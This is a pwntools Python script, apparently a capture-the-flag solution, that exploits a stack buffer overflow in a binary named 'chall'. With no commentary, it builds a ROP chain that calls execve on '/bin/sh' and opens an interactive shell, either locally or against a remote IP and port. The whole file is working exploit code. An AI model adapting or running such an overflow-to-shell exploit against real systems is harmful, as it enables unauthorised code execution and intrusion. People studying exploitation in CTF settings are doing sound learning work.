from pwn import *

gs = '''
continue
'''

elf = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("83.136.252.167", 40382)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

offset = 40

xor_rsi_rsi = 0x000000000040137e
xor_rdx_rdx = 0x000000000040138d
pop_rax_ret = 0x0000000000401371
syscall = 0x00000000004013af
mov_rdi_rsp = 0x000000000040139c

bss = elf.bss()

payload = b"".join([
    b"A"*offset,
    p64(pop_rax_ret),
    p64(0x3b),
    p64(xor_rsi_rsi),
    p64(xor_rdx_rdx),
    p64(mov_rdi_rsp),
    b"/bin/sh\x00",
    p64(syscall)      # syscall
])

io.sendlineafter("> ", payload.ljust(96, b"\x00"))
io.interactive()
